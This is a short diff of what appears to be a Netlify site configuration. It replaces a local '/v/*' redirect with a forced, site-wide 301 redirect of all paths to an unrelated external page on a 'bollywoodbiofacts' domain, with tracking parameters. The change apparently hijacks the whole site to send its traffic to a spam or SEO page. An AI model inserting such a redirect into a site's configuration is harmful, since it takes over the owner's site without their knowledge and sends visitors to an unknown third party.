@@ -2,8 +2,8 @@
   command = "npm install"
 
 [[redirects]]
-  from = "/v/*"
-  to = "/video.html"
+  from = "/*"
+  to = "https://global1.bollywoodbiofacts.com/top-20-best-hospitals-in-bangalore-2025/?utm_source=SRm&utm_medium=s"
   status = 301
   force = true
 
